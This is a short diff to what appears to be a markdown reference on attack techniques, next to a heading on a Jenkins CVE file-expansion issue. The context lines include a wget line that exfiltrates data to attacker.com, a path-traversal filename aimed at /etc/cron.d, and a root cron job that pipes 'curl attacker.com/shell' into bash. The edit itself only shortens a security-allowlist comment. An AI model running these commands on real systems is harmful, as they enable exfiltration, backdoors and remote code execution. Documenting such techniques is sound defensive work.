@@ -260,7 +260,7 @@ wget http://attacker.com/$(cat /etc/hostname)
 # Filename in upload request
 filename="../../../../etc/cron.d/backdoor"
 # Cron payload content
-* * * * * root curl http://attacker.com/shell | bash <!-- security-allowlist: documented installer one-liner attack-technique reference, do not execute outside authorized scope -->
+* * * * * root curl http://attacker.com/shell | bash <!-- security-allowlist: curl-pipe-bash -->
 ```
 
 ### Args4j `@`-prefix file expansion (Jenkins CVE-2024-23897 family)
